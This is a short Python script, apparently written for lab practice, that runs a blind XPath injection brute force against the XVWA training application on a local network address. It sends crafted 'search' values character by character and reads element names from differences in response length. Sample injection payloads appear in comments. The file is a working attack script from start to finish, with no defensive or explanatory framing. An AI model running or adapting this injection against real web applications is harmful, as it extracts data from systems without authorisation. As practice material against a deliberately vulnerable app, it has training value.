#!/usr/bin/python3

import sys, signal, requests, string
from pwn import *


def def_handler(sig,frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

#Ctrl+c
signal.signal(signal.SIGINT, def_handler)

#Global variables
mainUrl = "http://192.168.0.106/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters + ' '


def xPathInjection():
    data = ""
    p1 = log.progress("Brute force")
    p1.status("Starting brute force attack")
    p2 = log.progress("Gathering data...")

#search=1' and string-length(name(/*[1]))='7&submit=
#search=1' and substring(name(/*[1]/*[1]/*[1]),1,1)='I&submit=
    time.sleep(2)
    for firstPosition in range(0,6):
        for secondPosition in range(1,20):
            for character in characters:
                post_data = {
                    'search' : "1' and substring(name(/*[1]/*[1]/*[%d]),%d,1)='%s" % (firstPosition,secondPosition,character),
                    'submit' : ''
                }
                r = requests.post(mainUrl, data=post_data)
                #print(len(r.text))
                if len(r.text) != 8691 and len(r.text) != 8692:
                    #print(len(r.text))
                    data += character
                    p2.status(data)
                    break 

if __name__ == '__main__':
    xPathInjection()



